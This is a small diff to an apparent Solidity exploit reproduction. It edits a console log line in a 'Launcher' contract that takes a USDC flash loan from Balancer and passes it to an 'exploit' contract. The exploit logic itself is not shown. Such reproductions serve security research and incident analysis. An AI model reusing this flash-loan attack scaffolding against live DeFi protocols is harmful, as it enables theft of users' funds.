@@ -23,7 +23,7 @@ contract Launcher {
         uint256[] memory amounts = new uint[](1);
         tokens[0] = USDC;
         amounts[0] = 150000000000000;
-        console.log("[Launcher] (2) Flash loan USDC and WETH from Balancer");
+        console.log("[Launcher] (2) Flash loan USDC from Balancer");
         balancerVault.flashLoan(exploit, tokens, amounts, "0x");
         console.log("[Launcher] (10) End");
         console.log("[Launcher]      ETH: %s", address(this).balance);
